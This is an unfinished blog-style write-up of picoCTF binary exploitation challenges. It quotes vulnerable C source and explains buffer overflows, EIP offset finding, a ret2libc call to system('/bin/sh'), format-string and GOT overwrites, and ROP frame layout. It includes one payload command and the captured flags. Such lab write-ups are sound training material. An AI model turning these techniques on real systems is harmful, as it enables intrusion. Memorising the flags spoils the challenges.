# Description
This was my first time playing in picoCTF. I was pleasantly surprised with the quality and progression of the challenges. Using this to my advantage, I decided to go through the binary exploitation series in an attempt to better hone my fundamentals and exploit development skills.

NOTE: This post is still incomplete - I will be updating the rest of it shortly.

# Buffer Overflow 0
In this challenge, we're given a vulnerable binary and it's corresponding source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL)
  {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  if (argc > 1)
  {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
  {
    printf("This program takes 1 argument.\n");
  }
  return 0;
}
```

From a cursory glance at the source code, we see the binary take a single command line argument and copies it into a character buffer of size 16, without any length checks. This is where our overflow will occur. Next we must find the offset to `eip` - once we control `eip`, we control the execution of the binary.

Using `pattern_create.rb` and `pattern_offset.rb` we find the offset of `eip` is 28 characters. In gdb:
``run $(`locate pattern_create` -l 50)``

This displays the crash and tells us that `eip` is trying to find the address of `a9Ab`. Using `` `locate pattern_offset.rb` -q a9Ab`` we know now that any input after 28 characters will overwrite `eip`. Thus, we can disasemble the function `sigsegv_handler` and overwrite `eip` with it's address.

```bash
./vuln $(python -c 'print "A"*28 + "\x2b\x86\x04\x08"')
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
```

# Buffer Overflow 1
Similar to the previous challenge, we are give a binary and it's source code.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

This binary performs the vulnerable `gets()` call for a 32 character buffer - again with no length constraints on our input. Using the same tactics as before, we fuzz the input with a unique string to determine the offset of `eip`. With `pattern_create.rb` we get an offset of 44.

Appending the address of `win`, we get the flag.
```bash
picoCTF{addr3ss3s_ar3_3asy14941911}
```

## Leak Me
Given the binary and source for this challenge, we start by parsing the source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}


int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  // real pw:
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];

  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));

  printf("What is your name?\n");

  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL){
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';

  if (!strcmp(password_input, password)) {
    flag();
  }
  else {
    printf("Incorrect Password!\n");
  }
  return 0;
}
```

First, we notice that memory has first been allocated for a password and then the name. If we are able to overflow the name pointer, then we would be able to leak the contents of the password. Sending a name of length 300 proved this correct!

## Shellcode
```
picoCTF{shellc0de_w00h00_b766002c}
```

## Buffer Overflow 2
This challenge was nearly identical to Buffer Overflow 1, with a single caveat - we had to pass two arguments to the `win()` function. Due to the calling structure of x86, we structured our shellcode to call the `win()` function, followed by the address of `return` in `main`, followed by the arguments required to print the flag.
```
picoCTF{addr3ss3s_ar3_3asy1b78b0d8}
```

## got-2-learn-libc
After reading the source code we see that `vuln()` has a simple buffer overflow. Using `pattern_create.rb` and `pattern_offset.rb`, we find an offset of 160. We now have control of `eip` and it appears the challenge requires you to call `execve` or `system` with the provided `/bin/sh` string. To do this, we need to first figure out which libc we're working with. To do this we try calling one of the provided addresses. First we try `puts()` but no luck. Next we try `fflush` and voila!

```c
0xf7d74010 in ?? () from /lib/i386-linux-gnu/libc.so.6
```

Great - but this is our local libc. This reminds me! There is a much easier way to find which libc is being used.

```bash
$ ldd vuln
    linux-gate.so.1 =>  (0xf76e8000)
    libc.so.6 => /lib32/libc.so.6 (0xf7522000)
    /lib/ld-linux.so.2 (0xf76e9000)
```

Copying over this file, we can calculate the offset of `system()` from `fflush()` via libc base pointer. With all our address, we make a call to `system('/bin/sh')` and we get our flag.

## Echooo


## Authenticate
Analyzing the source code tells us that in order to get the flag, we must change the value of `authenticaed` to any integer other than 0 (recall: any value beside 0 evaluates to True in C). Since the code takes our input and displays it back to us via `printf()` we see that this may be a potential format string attack. From our reading, we know that via a format string vulnerability, we can write an integer into any arbitrary address (given that ASLR is disabled).

Disasembling the if/else statement, we see that `mov    eax,ds:0x804a04c`. We know that C stores globally delarced variables in the Data Segment, i.e. DS. Thus we have the address of the global int, `authenticated`. With this, we can overwrite the value to anything else.

```

```

## got-shell?
This challenge allows two inputs - we can pick an address and value to write into. Our tentative idea is to overwrite the value of the last `puts()` statement in the global offset table (GOT) with the address of the `win()` function, hopefully launching us a shell.

```
picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81}
```

## rop chain
This challenge presents us with a typically looking memory corruption. With `pattern_offset.rb` we find the offset to control `eip`. After this, we begin to break down the logic of the code. To get the flag, we need to set both `win1` and `win2` to true while also passing the argument `0xDEADBAAD` to the `flag()` function. To understand how to call these functions and pass them each parameters requires we understand how to call stack frame works.

```
Address of win1
Return to address of win_function2()
Return to address of flag
argument for win_function2()
arguement for flag()
```
